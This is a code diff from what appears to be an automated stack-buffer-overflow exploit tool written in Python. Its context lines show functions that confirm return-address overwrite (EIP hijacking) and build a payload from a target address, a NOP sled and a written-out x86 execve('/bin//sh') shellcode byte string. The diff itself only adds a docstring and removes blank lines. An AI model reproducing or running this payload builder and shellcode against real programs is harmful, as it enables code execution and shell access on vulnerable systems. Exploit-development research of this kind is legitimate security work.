@@ -65,7 +65,6 @@ def root_cause_analysis(crash_input: bytes, arg_config: argparse.Namespace):
     Analyzes the provided payload input to confirm whether it can reach and potentially overwrite
     the return address, causing EIP hijacking.
 
-
     Parameters:
     crash_input: The payload input that potentially overwrites the return address of the vulnerable function.
         
@@ -135,6 +134,17 @@ def crash_explorer():
     return payload_mutation
 
 def payload_builder(crash_input: bytes, target_bin: str):
+    """
+    Generates the final payload (byte sequence) for the exploitation process and writes it to a file.
+    Overwrites the bytes that fall on the return address with a valid target address on the existing crash input, 
+    appends a nopsled and finally the shellcode.
+
+    Parameters:
+    crash_input: Input that previously crashed the target binary by successfully overwriting the return address.
+
+    target_bin: The binary file we want to exploit.
+
+    """
 
     target_address = stack_middle_address(target_ra(target_bin))
     shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
@@ -144,7 +154,6 @@ def payload_builder(crash_input: bytes, target_bin: str):
     payload += shellcode
 
     open("payload", "wb").write(payload)
-
 
     return
 
